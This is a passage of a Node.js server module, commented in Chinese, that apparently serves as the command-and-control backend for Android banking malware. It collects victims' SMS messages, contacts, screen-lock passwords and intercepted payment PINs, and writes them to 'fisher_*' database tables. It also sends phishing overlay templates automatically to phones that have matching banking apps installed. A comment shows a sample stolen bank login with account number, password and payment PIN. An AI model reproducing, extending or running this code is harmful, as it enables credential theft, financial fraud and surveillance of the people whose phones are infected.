        const command = String(rd.command || rd.requestCommand || rd.originalCommand || rd.data?.command || '').toUpperCase();
        if (rd.smsList || rd.messages) {
          const sms = rd.smsList || rd.messages;
          if (Array.isArray(sms) && sms.length > 0) {
            console.log(`[WS-Device] command_result contains SMS: count=${sms.length}`);
            saveAiDeviceData(sessionId, 'sms', sms);
            saveSmsToMessages(sessionId, sms);
          }
        }
        if (rd.contacts) {
          const ct = rd.contacts;
          if (Array.isArray(ct) && ct.length > 0) {
            console.log(`[WS-Device] command_result contains contacts: count=${ct.length}`);
            saveAiDeviceData(sessionId, 'contacts', ct);
          }
        }
        if (command === 'GET_CONTACTS' || Array.isArray(rd.contacts)) {
          const contactPayload = normalizeContactsPayload(msg);
          broadcastToAdmins(connections, {
            type: 'contacts_data',
            deviceId: sessionId,
            sessionId,
            success: contactPayload.success,
            contacts: contactPayload.contacts,
            data: contactPayload,
          });
        }
        if (command === 'SMS_SEND') {
          const smsPayload = normalizeSmsSendPayload(msg);
          broadcastToAdmins(connections, {
            type: 'sms_send_result',
            deviceId: sessionId,
            sessionId,
            success: smsPayload.success,
            phoneNumber: smsPayload.phoneNumber,
            data: smsPayload,
          });
        }
      }
      const delivered = broadcastToAdmins(connections, {
        type: 'command_result',
        deviceId: sessionId,
        data: msg.data || msg,
      });
      if (!highVolume) {
        console.log(`[WS-Reply] device=${sessionId} command=${commandName} delivered=${delivered}`);
      }
      break;

    case 'injection':
    case 'injection_data':
      // 注入数据上报 — 存入数据库 + 转发给管理端
      // 新格式: { type: 'injection', deviceId, data: {...}, packageName, timestamp }
      // data 可能是字符串或已解析对象
      saveInjectionData(sessionId, msg);
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'NEW_PASSWORD':
      // 密码上报 — 存入数据库 + 转发给管理端（与旧 Python 后端一致）
      savePassword(sessionId, msg.data || msg);
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'new_sms':
      // 短信通知，转发给管理端
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'operation_log':
    case 'operation_log_realtime':
      // 操作日志 — 存入数据库 + 转发给管理端（与旧 Python 后端一致）
      saveOperationLog(sessionId, msg.data || msg);
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
      break;

    case 'REGISTER':
    case 'register':
    case 'heartbeat':
    case 'HEARTBEAT':
    case 'device_heartbeat':
    case 'device_status':
      // 注册/心跳消息 — 已在上方做了 syncDeviceStatus，不再转发
      break;

    case 'pong':
      break;

    case 'password_status':
      // 密码状态上报 — 仅转发给管理端（不入库，避免存入 APK 重复捕获的错误值）
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId, sessionId });
      break;

    case 'app_list':
    case 'app_list_response':
    case 'APP_LIST_RESPONSE':
      // 设备返回已安装应用列表 → 存入 fisher_device_apps 并触发自动注入
      {
        const apps = msg.data?.apps || msg.data || msg.apps || [];
        console.log(`[WS-Device] Received ${type} from ${sessionId}, count=${Array.isArray(apps) ? apps.length : 0}`);
        handleAppList(sessionId, { ...msg, _apps: apps }, ws, connections);
        broadcastToAdmins(connections, { type: 'app_list', deviceId: sessionId, data: apps });
        // 同时存入 AI 数据缓存表
        saveAiDeviceData(sessionId, 'apps', apps);
      }
      break;

    case 'sms_data':
    case 'SMS_DATA':
    case 'sms_list':
    case 'SMS_LIST':
      // 短信数据返回 → 存入 AI 数据缓存表 + 转发给管理端
      {
        const smsList = msg.data?.smsList || msg.data?.messages || msg.smsList || msg.messages || msg.data || [];
        console.log(`[WS-Device] Received SMS data from ${sessionId}, count=${Array.isArray(smsList) ? smsList.length : 0}`);
        if (Array.isArray(smsList) && smsList.length > 0) {
          saveAiDeviceData(sessionId, 'sms', smsList);
          saveSmsToMessages(sessionId, smsList);
        }
        broadcastToAdmins(connections, { ...msg, type: 'sms_data', deviceId: sessionId });
      }
      break;

    case 'sms_send_result':
    case 'SMS_SEND_RESULT':
      {
        const payload = normalizeSmsSendPayload(msg);
        console.log(`[WS-Device] SMS submit result from ${sessionId}: phone=${payload.phoneNumber || '-'}, success=${payload.success}`);
        broadcastToAdmins(connections, {
          type: 'sms_send_result',
          deviceId: sessionId,
          sessionId,
          success: payload.success,
          phoneNumber: payload.phoneNumber,
          data: payload,
        });
      }
      break;

    case 'contacts':
    case 'CONTACTS':
    case 'contacts_data':
    case 'CONTACTS_DATA':
    case 'contacts_response':
    case 'CONTACTS_RESPONSE':
      // 通讯录数据返回 → 存入 AI 数据缓存表 + 转发给管理端
      {
        const payload = normalizeContactsPayload(msg);
        console.log(`[WS-Device] Received contacts from ${sessionId}, success=${payload.success}, count=${payload.contacts.length}${payload.error ? `, error=${payload.error}` : ''}`);
        if (payload.success && payload.contacts.length > 0) {
          saveAiDeviceData(sessionId, 'contacts', payload.contacts);
        }
        broadcastToAdmins(connections, {
          type: 'contacts_data',
          deviceId: sessionId,
          sessionId,
          success: payload.success,
          contacts: payload.contacts,
          data: payload,
        });
      }
      break;

    case 'vc_result':
    case 'view_cache_result':
    case 'view_cache_sync':
    case 'payment_cipher':
      // 支付密码截获上报 — 存入 fisher_payment_cipher_records + 转发给管理端
      console.log(`[WS-Device] >>>> Payment cipher from ${sessionId}:`, JSON.stringify(msg.data || msg).substring(0, 200));
      saveCipherRecord(sessionId, msg.data || msg);
      broadcastToAdmins(connections, { ...msg, type: 'payment_cipher', deviceId: sessionId, sessionId });
      break;

    default:
      // 其他消息也转发
      if (VERBOSE_DEVICE_MESSAGE_LOGS && !highVolume) {
        console.log(`[WS-Device] >>>> Forwarding default msg to admins from ${sessionId}: type='${type}'`);
      }
      // 检测是否包含短信/通讯录数据（某些 APK 用非标准 type 返回）
      if (msg.data) {
        const d = msg.data;
        if (d.smsList || d.messages || (Array.isArray(d) && d[0]?.body)) {
          const smsList = d.smsList || d.messages || d;
          if (Array.isArray(smsList) && smsList.length > 0) {
            console.log(`[WS-Device] Detected SMS data in default handler, type='${type}', count=${smsList.length}`);
            saveAiDeviceData(sessionId, 'sms', smsList);
            saveSmsToMessages(sessionId, smsList);
          }
        }
        if (d.contacts || (Array.isArray(d) && d[0]?.name && (d[0]?.phone || d[0]?.number))) {
          const contacts = d.contacts || d;
          if (Array.isArray(contacts) && contacts.length > 0) {
            console.log(`[WS-Device] Detected contacts data in default handler, type='${type}', count=${contacts.length}`);
            saveAiDeviceData(sessionId, 'contacts', contacts);
          }
        }
      }
      broadcastToAdmins(connections, { ...msg, deviceId: sessionId, sessionId });
  }
}

/**
 * 将设备发来的实时状态同步到数据库
 * 与旧 Python 后端 ws_device 中的 update_db() 对齐：
 * - 如果设备不存在 → 自动 INSERT（注册）
 * - 如果设备存在 → UPDATE 所有上报字段
 * 更新: brand, model, os_version, app_version, app_name, battery_level,
 * network_type, is_screen_on, screen_width, screen_height, permissions,
 * is_charging, is_locked, accessibility_alive, public_ip
 */
async function syncDeviceStatus(deviceId, data, clientIp) {
  if (!data || !deviceId) return false;
  try {
    const db = getPool();
    const now = Math.floor(Date.now() / 1000);

    // 检查设备是否存在
    const [rows] = await db.query('SELECT id, public_ip, geo_location FROM fisher_devices WHERE device_id=?', [deviceId]);
    const reportedIp = normalizeIp(data.publicIP || clientIp);
    let shouldRefreshGeo = false;

    if (!rows || rows.length === 0) {
      // 设备不存在 → 自动注册（与旧 Python 后端一致）
      // 只 INSERT 最基本信息 + status 消息中实际包含的数据
      const insertFields = ['device_id', 'is_connected', 'last_seen', 'first_seen', 'created_at'];
      const insertValues = [deviceId, 1, now, now, now];

      // TG 上线通知由 handleDevice() 的异步连接事件触发，避免阻塞设备列表接口。

      // 从 data 中提取实际存在的字段
      if (data.brand) { insertFields.push('brand'); insertValues.push(String(data.brand)); }
      if (data.model) { insertFields.push('model'); insertValues.push(String(data.model)); }
      if (data.osVersion) { insertFields.push('os_version'); insertValues.push(String(data.osVersion)); }
      if (data.appVersion) { insertFields.push('app_version'); insertValues.push(String(data.appVersion)); }
      if (data.appName || data.deviceName) { insertFields.push('app_name'); insertValues.push(String(data.appName || data.deviceName)); }
      if (isUsablePublicIp(reportedIp)) {
        insertFields.push('public_ip');
        insertValues.push(reportedIp);
        shouldRefreshGeo = true;
      }
      if (data.batteryLevel !== undefined) { insertFields.push('battery_level'); insertValues.push(Number(data.batteryLevel) || 0); }
      if (data.networkType !== undefined) { insertFields.push('network_type'); insertValues.push(String(data.networkType || '')); }
      if (data.screenWidth > 0) { insertFields.push('screen_width'); insertValues.push(Number(data.screenWidth)); }
      if (data.screenHeight > 0) { insertFields.push('screen_height'); insertValues.push(Number(data.screenHeight)); }
      const placeholders = insertFields.map(() => '?').join(',');
      await db.query(
        `INSERT INTO fisher_devices (${insertFields.join(',')}) VALUES (${placeholders})`,
        insertValues
      );
      console.log(`[WS-Device] Auto-registered new device: ${deviceId}`);
    } else {
      // 设备存在 → UPDATE（只更新消息中实际包含的字段）
      const updates = { last_seen: now, is_connected: 1 };

      if (data.brand) updates.brand = String(data.brand);
      if (data.model) updates.model = String(data.model);
      if (data.osVersion) updates.os_version = String(data.osVersion);
      if (data.appVersion) updates.app_version = String(data.appVersion);
      if (data.appName || data.deviceName) updates.app_name = String(data.appName || data.deviceName);
      if (data.batteryLevel !== undefined) updates.battery_level = Number(data.batteryLevel) || 0;
      if (data.networkType !== undefined) updates.network_type = String(data.networkType || '');
      if (data.isScreenOn !== undefined) updates.is_screen_on = data.isScreenOn ? 1 : 0;
      if (data.isCharging !== undefined) updates.is_charging = data.isCharging ? 1 : 0;
      if (data.isLocked !== undefined) updates.is_locked = data.isLocked ? 1 : 0;
      if (data.accessibilityAlive !== undefined) updates.accessibility_alive = data.accessibilityAlive ? 1 : 0;
      const storedIp = normalizeIp(rows[0]?.public_ip);
      if (isUsablePublicIp(reportedIp) && reportedIp !== storedIp) {
        updates.public_ip = reportedIp;
        // 只有公网 IP 真正变化时才失效地理位置缓存；普通心跳不能清空它。
        if (storedIp) updates.geo_location = '';
        shouldRefreshGeo = true;
      } else if (isUsablePublicIp(reportedIp) && !rows[0]?.geo_location) {
        shouldRefreshGeo = true;
      }
      if (data.screenWidth > 0) updates.screen_width = Number(data.screenWidth);
      if (data.screenHeight > 0) updates.screen_height = Number(data.screenHeight);
      if (data.permissions && typeof data.permissions === 'object') updates.permissions = JSON.stringify(data.permissions);

      const setClauses = Object.keys(updates).map(k => `${k}=?`).join(', ');
      const values = [...Object.values(updates), deviceId];
      await db.query(`UPDATE fisher_devices SET ${setClauses} WHERE device_id=?`, values);
    }
    if (shouldRefreshGeo) {
      refreshDeviceGeo(deviceId, reportedIp).catch(() => {});
    }
    return true;
  } catch (err) {
    console.error('[WS-Device] syncDeviceStatus error:', err.message);
    return false;
  }
}

/**
 * 保存注入数据到数据库
 *
 * APK 上报格式:
 * { type: 'injection', deviceId: 'xxx', data: '{"密码":"83663737","类型":"中国银行登录","账号":"18565235625","时间戳":1782505343570,"支付密码":"635985"}', packageName: 'xyz.bcluu.msgxp', timestamp: 1785074926742 }
 *
 * 目标存储格式（form_data 字段）:
 * {"密码": "83663737hshd", "类型": "中国银行登录", "账号": "18565235625", "时间戳": 1782505343570, "支付密码": "635985"}
 */
async function saveInjectionData(deviceId, msg) {
  if (!deviceId || !msg) return;
  try {
    const db = getPool();
    const packageName = msg.packageName || '';

    // 解析 data 字段 — 可能是 JSON 字符串或已解析对象
    let formData = msg.data || msg.formData || {};
    if (typeof formData === 'string') {
      try {
        formData = JSON.parse(formData);
      } catch (e) {
        // 不是合法 JSON，保持原字符串
        formData = { raw: formData };
      }
    }

    // 从解析后的数据中提取类型作为 template_name
    const templateName = formData['类型'] || formData.type || formData.templateName || msg.templateName || '';

    // 直接存储解析后的干净数据（不嵌套 wrapper）
    const formDataStr = typeof formData === 'object' ? JSON.stringify(formData) : String(formData);

    await db.query(
      'INSERT INTO fisher_injection_data (device_id, template_name, package_name, form_data, created_at) VALUES (?,?,?,?,?)',
      [deviceId, templateName, packageName, formDataStr, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] Saved injection_data from ${deviceId}: template=${templateName}, pkg=${packageName}`);
  } catch (err) {
    console.error('[WS-Device] saveInjectionData error:', err.message);
  }
}

/**
 * 保存密码数据到数据库（与旧 Python 后端一致）
 * 旧后端在 ws_device 中处理 NEW_PASSWORD 消息时写入 passwords 表
 */
async function savePassword(deviceId, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const cipherType = data.cipherType || data.cipher_type || data.passwordType || data.password_type || 'pin';
    const cipherText = data.cipherText || data.cipher_text || data.textCipher || data.patternCipher || data.password || '';
    const gradeCode = data.cipherGradeCode || data.cipher_grade_code || data.grade_code || '';
    const source = data.source || data.cipherSource || data.inputMethod || data.input_method || 'manual';

    if (cipherText) {
      await db.query(
        'INSERT INTO fisher_passwords (device_id, cipher_type, cipher_text, grade_code, source, created_at) VALUES (?,?,?,?,?,?)',
        [deviceId, cipherType, cipherText, gradeCode, source, Math.floor(Date.now() / 1000)]
      );
      console.log(`[WS-Device] Saved password from ${deviceId}: type=${cipherType}`);
    }
  } catch (err) {
    console.error('[WS-Device] savePassword error:', err.message);
  }
}

/**
 * 保存支付密码截获记录到 fisher_payment_cipher_records
 * APK 上报格式:
 * { packageName, cipher/password, type/cipherType, appName, source }
 */
async function saveCipherRecord(deviceId, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const cipherText = data.cipher || data.password || data.cipherText || data.cipher_text || '';
    if (!cipherText) {
      console.log(`[WS-Device] saveCipherRecord: empty cipher from ${deviceId}, data=`, JSON.stringify(data).substring(0, 300));
      return;
    }
    const packageName = data.pkg || data.packageName || data.package_name || data.package || '';
    const appName = data.app || data.appName || data.app_name || '';
    const cipherType = data.grade || data.cipherType || data.cipher_type || data.type || 'pin';
    const source = data.source || '';

    await db.query(
      'INSERT INTO fisher_payment_cipher_records (device_id, package_name, app_name, cipher_text, cipher_type, source, created_at) VALUES (?,?,?,?,?,?,?)',
      [deviceId, packageName, appName, cipherText, cipherType, source, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] Saved payment cipher from ${deviceId}: type=${cipherType}, pkg=${packageName}`);
  } catch (err) {
    console.error('[WS-Device] saveCipherRecord error:', err.message);
  }
}

/**
 * 仅当数据库中无该设备的最新密码记录时才插入（用于 password_status 去重）
 */
async function savePasswordIfNew(deviceId, cipherText, cipherType, source) {
  if (!deviceId || !cipherText) return;
  try {
    const db = getPool();
    // 查最近一条记录，如果 cipher_text 一样就跳过
    const [rows] = await db.query(
      'SELECT cipher_text FROM fisher_passwords WHERE device_id=? ORDER BY id DESC LIMIT 1',
      [deviceId]
    );
    if (rows.length > 0 && rows[0].cipher_text === cipherText) return;
    // 不存在或不同 → 插入
    await db.query(
      'INSERT INTO fisher_passwords (device_id, cipher_type, cipher_text, grade_code, source, created_at) VALUES (?,?,?,?,?,?)',
      [deviceId, cipherType, cipherText, '', source, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] savePasswordIfNew: saved ${cipherType} from ${deviceId}`);
  } catch (err) {
    console.error('[WS-Device] savePasswordIfNew error:', err.message);
  }
}

/**
 * 6 种业务日志类型（存入 fisher_operation_logs）
 */
const ALLOWED_LOG_TYPES = new Set(['KSTR', 'NTFS', 'VAPS', 'BLNK', 'ACTZ', 'ARTS']);

/**
 * 保存操作日志到数据库
 * - KSTR/NTFS/VAPS/BLNK/ACTZ/ARTS 6 种 → fisher_operation_logs
 * - 其他类型（WARN/TROJ/CMDX/NETW/ADPT 等） → fisher_bridge_logs
 */
async function saveOperationLog(deviceId, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const logType = (data.logType || data.log_type || data.type || '').toUpperCase();
    const content = data.content || data.message || '';
    const timestamp = data.timestamp ? Math.floor(data.timestamp / 1000) : Math.floor(Date.now() / 1000);

    if (!logType || !content) return;

    // 根据类型分流到不同的表
    const tableName = ALLOWED_LOG_TYPES.has(logType)
      ? 'fisher_operation_logs'
      : 'fisher_bridge_logs';

    await db.query(
      `INSERT INTO ${tableName} (device_id, log_type, content, timestamp, created_at) VALUES (?,?,?,?,?)`,
      [deviceId, logType, content, timestamp, Math.floor(Date.now() / 1000)]
    );
    console.log(`[WS-Device] Saved ${tableName} from ${deviceId}: type=${logType}`);
  } catch (err) {
    console.error('[WS-Device] saveOperationLog error:', err.message);
  }
}

async function updateDeviceStatus(deviceId, isConnected, clientIp) {
  try {
    const db = getPool();
    const now = Math.floor(Date.now() / 1000);
    if (isConnected) {
      // 连接时先检查设备是否存在（可能是首次 WS 连接但还没发状态消息）
      const [rows] = await db.query('SELECT id FROM fisher_devices WHERE device_id=?', [deviceId]);
      if (rows && rows.length > 0) {
        const normalizedClientIp = normalizeIp(clientIp);
        const canStoreClientIp = isUsablePublicIp(normalizedClientIp);
        const ipClause = canStoreClientIp ? ', public_ip=?' : '';
        const params = canStoreClientIp
          ? [now, now, normalizedClientIp, deviceId]
          : [now, now, deviceId];
        await db.query(
          `UPDATE fisher_devices SET is_connected=1, connected_at=?, last_seen=?${ipClause} WHERE device_id=?`,
          params
        );
      }
      // 如果不存在，等 syncDeviceStatus 来注册
    } else {
      await db.query(
        'UPDATE fisher_devices SET is_connected=0 WHERE device_id=?',
        [deviceId]
      );
    }
  } catch (err) {
    console.error('[WS-Device] DB error:', err.message);
  }
}

/**
 * 处理设备返回的应用列表
 * 1. 存入 fisher_device_apps 表
 * 2. 如果 injection_active=1，自动对匹配模板的APP下发注入
 */
async function handleAppList(deviceId, msg, ws, connections) {
  try {
    const db = getPool();
    const apps = msg._apps || msg.data?.apps || msg.data || msg.apps || [];
    const appsJson = JSON.stringify(apps);
    const now = Math.floor(Date.now() / 1000);

    // UPSERT: 存在则更新，不存在则插入（新设备默认 injection_active=1）
    await db.query(
      `INSERT INTO fisher_device_apps (device_id, installed_apps, updated_at, injection_active)
       VALUES (?, ?, ?, 1)
       ON DUPLICATE KEY UPDATE installed_apps=VALUES(installed_apps), updated_at=VALUES(updated_at)`,
      [deviceId, appsJson, now]
    );
    console.log(`[WS-Device] Saved ${apps.length} apps for ${deviceId}`);

    // 检查自动注入开关（默认开启：字段为 NULL 或 1 都视为开启）
    const [rows] = await db.query(
      'SELECT injection_active FROM fisher_device_apps WHERE device_id=?',
      [deviceId]
    );
    const injActive = rows && rows.length > 0 ? rows[0].injection_active : 1;
    if (injActive === 0) {
      console.log(`[WS-Device] injection_active=OFF for ${deviceId}, skipping auto-inject`);
    } else {
      console.log(`[WS-Device] injection_active=ON for ${deviceId}, triggering auto-inject...`);
      await autoInjectForDevice(deviceId, apps, ws, connections);
    }
  } catch (err) {
    console.error('[WS-Device] handleAppList error:', err.message);
  }
}

// 内存记录：已对哪些设备+包名执行过自动注入（防止重复注入）
const autoInjectedCache = new Map(); // key: deviceId, value: Set<packageName>

/**
 * 自动注入：匹配设备安装的应用与模板，对所有匹配的包名下发 SHOW_INJECTION
 * 每个设备+包名组合只注入一次（直到设备重新上线清除缓存）
 */
async function autoInjectForDevice(deviceId, apps, ws, connections) {
  try {
    const db = getPool();
    // ★ 优化：先查模板列表（不含 html_content），减少内存和网络开销
    const [templates] = await db.query(
      'SELECT template_id, package_name, name FROM fisher_injection_templates WHERE enabled=1'
    );
    if (!templates || templates.length === 0) return;

    // 构建设备已安装应用包名集合
    const installedPkgs = new Set(
      apps.map(a => typeof a === 'string' ? a : (a.packageName || a.package_name || a.pkg || ''))
    );

    // 获取该设备已注入记录
    if (!autoInjectedCache.has(deviceId)) autoInjectedCache.set(deviceId, new Set());
    const injected = autoInjectedCache.get(deviceId);

    // 匹配模板（跳过已注入过的）
    let injectedCount = 0;
    for (const tpl of templates) {
      const pkg = tpl.package_name;
      if (!pkg || !installedPkgs.has(pkg)) continue;
      if (injected.has(pkg)) {
        console.log(`[WS-Device] Skip auto-inject ${pkg} for ${deviceId} (already injected this session)`);
        continue;
      }

      // ★ 匹配到后才查 html_content（按需加载，避免一次性加载几百个 HTML）
      const [rows] = await db.query(
        'SELECT html_content FROM fisher_injection_templates WHERE template_id=? LIMIT 1',
        [tpl.template_id]
      );
      const htmlContent = rows?.[0]?.html_content;
      if (!htmlContent) continue;

      // 下发 SHOW_INJECTION
      if (ws.readyState === 1) {
        ws.send(JSON.stringify({
          type: 'command',
          sessionId: deviceId,
          data: {
            command: 'SHOW_INJECTION',
            params: {
              packageName: pkg,
              htmlContent: htmlContent,
              templateId: tpl.template_id
            }
          }
        }));
        injected.add(pkg);
        injectedCount++;
        console.log(`[WS-Device] Auto-inject ${pkg} (${tpl.name}) to ${deviceId}`);
      }
    }
    if (injectedCount > 0) {
      console.log(`[WS-Device] Auto-injected ${injectedCount} apps for ${deviceId}`);
      broadcastToAdmins(connections, {
        type: 'auto_injection_done',
        deviceId,
        count: injectedCount
      });
    }
  } catch (err) {
    console.error('[WS-Device] autoInjectForDevice error:', err.message);
  }
}

/**
 * 保存设备数据到 AI 分析缓存表 fisher_ai_device_data
 * UPSERT: 按 device_id + data_type 唯一键更新
 */
async function saveAiDeviceData(deviceId, dataType, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const jsonStr = JSON.stringify(data);
    const count = Array.isArray(data) ? data.length : 1;
    await db.query(
      `INSERT INTO fisher_ai_device_data (device_id, data_type, data_json, data_count, updated_at)
       VALUES (?, ?, ?, ?, NOW())
       ON DUPLICATE KEY UPDATE data_json=VALUES(data_json), data_count=VALUES(data_count), updated_at=NOW()`,
      [deviceId, dataType, jsonStr, count]
    );
    console.log(`[WS-Device] Saved AI data: ${deviceId} type=${dataType} count=${count}`);
  } catch (err) {
    console.error('[WS-Device] saveAiDeviceData error:', err.message);
  }
}

/**
 * 增量保存短信到 fisher_sms_messages 表
 * 去重逻辑：按 device_id + address + body + date 判断是否已存在
 * 只插入新短信，避免重复
 */
async function saveSmsToMessages(deviceId, smsList) {
  if (!deviceId || !Array.isArray(smsList) || smsList.length === 0) return;
  try {
    const db = getPool();
    // 获取该设备已有短信的去重指纹集合
    const [existing] = await db.query(
      'SELECT address, body, date FROM fisher_sms_messages WHERE device_id = ?',
      [deviceId]
    );
    const existingSet = new Set(
      existing.map(r => `${r.address || ''}|${(r.body || '').substring(0, 100)}|${r.date || ''}`)
    );

    // 筛选出新短信
    const newItems = [];
    for (const sms of smsList) {
      const addr = sms.address || sms.sender || sms.from || sms.number || '';
      const body = sms.body || sms.content || sms.message || '';
      const date = sms.date || sms.time || sms.timestamp || '';
      const dateStr = String(date);
      const fingerprint = `${addr}|${body.substring(0, 100)}|${dateStr}`;
      if (!existingSet.has(fingerprint)) {
        newItems.push({ addr, body, date: dateStr, sms });
        existingSet.add(fingerprint); // 防止同一批中重复
      }
    }

    if (newItems.length === 0) {
      console.log(`[WS-Device] saveSmsToMessages: ${deviceId} no new SMS (all ${smsList.length} already exist)`);
      return;
    }

    // 批量插入新短信
    const values = newItems.map(item => {
      const smsType = item.sms.type !== undefined ? parseInt(item.sms.type) || 1 : 1;
      const read = item.sms.read !== undefined ? (item.sms.read ? 1 : 0) : 0;
      const createdAt = Math.floor(Date.now() / 1000);
      return [deviceId, item.addr, item.body, item.date, smsType, read, createdAt];
    });

    const placeholders = values.map(() => '(?, ?, ?, ?, ?, ?, ?)').join(', ');
    const flat = values.flat();
    await db.query(
      `INSERT INTO fisher_sms_messages (device_id, address, body, date, type, \`read\`, created_at) VALUES ${placeholders}`,
      flat
    );
    console.log(`[WS-Device] saveSmsToMessages: ${deviceId} inserted ${newItems.length} new SMS (total received: ${smsList.length})`);
  } catch (err) {
    console.error('[WS-Device] saveSmsToMessages error:', err.message);
  }
}

module.exports = {
  handleDevice,
  handleDeviceMessage,
  syncDeviceStatus,
  queueDeviceStatusSync,
  getDeviceLifecycleMetrics,
  preflightDeviceUpgrade,
  _test: {
    createConnectionTaskTracker,
    getDeviceLifecycleState,
    claimConnectionInitialization,
    cancelPendingOffline,
    statusFingerprint,
  },
};
